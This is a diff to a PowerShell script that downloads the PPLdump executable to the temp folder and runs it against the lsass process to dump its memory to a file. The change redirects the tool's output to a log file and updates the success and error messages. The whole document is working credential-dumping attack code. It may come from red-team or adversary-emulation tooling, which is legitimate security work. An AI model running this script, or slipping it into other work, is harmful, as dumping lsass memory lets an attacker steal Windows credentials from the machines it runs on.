@@ -19,6 +19,7 @@ else{
 }
 
 $dumpfile = "$env:tmp\ppldmp.dmp"
+$logfile = "$env:tmp\ppldmp.log"
 $outfileexe = "$env:tmp\ppldmp.exe"
 
 try {
@@ -27,13 +28,19 @@ try {
     if (Test-Path $outfileexe){
         Write-Host -ForegroundColor Green "[Success] PPLdump executable downloaded to $outfileexe"
         Write-Host -ForegroundColor Cyan "[Info] Executing PPLDump executable..."
-        & $outfileexe -f -v lsass lsass.dmp > $dumpfile
+        & $outfileexe -f -v lsass $dumpfile > $logfile
         Start-Sleep 1
         if (Test-Path $dumpfile){
-            Write-Host -ForegroundColor Green "[Success] PPLdump extracted to $dumpfile"
+            Write-Host -ForegroundColor Green "[Success] PPLdump dumped lsass process to $dumpfile"
         }
         else{
-            Write-Host -ForegroundColor Red "[Error] Failed to extract PPLdump to $dumpfile"
+            Write-Host -ForegroundColor Red "[Error] PPLdump failed to dump lsass process to $dumpfile"
+        }
+        if (Test-Path $logfile){
+            Write-Host -ForegroundColor Cyan "[Info] PPLdump log file is in $logfile"
+        }
+        else{
+            Write-Host -ForegroundColor Red "[Error] Could not write log file to $logfile"
         }
     }
     else{
